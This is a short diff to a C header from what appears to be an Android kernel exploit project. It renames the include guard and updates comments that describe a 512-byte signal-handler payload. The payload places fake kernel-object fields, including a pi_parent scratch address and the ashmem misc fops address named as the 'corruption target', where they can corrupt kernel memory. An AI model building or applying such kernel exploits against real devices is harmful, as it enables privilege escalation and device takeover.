@@ -1,5 +1,5 @@
-#ifndef OSS_CLONE_SIGUSR1_PAYLOAD_H
-#define OSS_CLONE_SIGUSR1_PAYLOAD_H
+#ifndef OSS_CLONE_SIGNAL_FRAME_PAYLOAD_H
+#define OSS_CLONE_SIGNAL_FRAME_PAYLOAD_H
 
 #include <stdint.h>
 
@@ -42,11 +42,11 @@ int sigusr1_install_handler(void);
  * Builds the 512-byte payload the handler will copy into the FPSIMD
  * vregs area, using this project's own already-verified page-relative
  * scratch addresses and real kernel addresses -- same inputs
- * fops_install.c's build_fops_install_object() already takes, not
+ * 04_fake_kernel_objects.c's build_fops_install_object() already takes, not
  * anything new to derive:
  *   +0x18 = pi_parent            (page_base | 0x1180)
  *   +0x20 = ashmem_misc_fops_addr (real kernel address, the corruption
- *                                  target -- same value fops_install.c
+ *                                  target -- same value 04_fake_kernel_objects.c
  *                                  writes into the fake waiter's
  *                                  pi_tree_entry.rb_right)
  *   +0x28 = 0
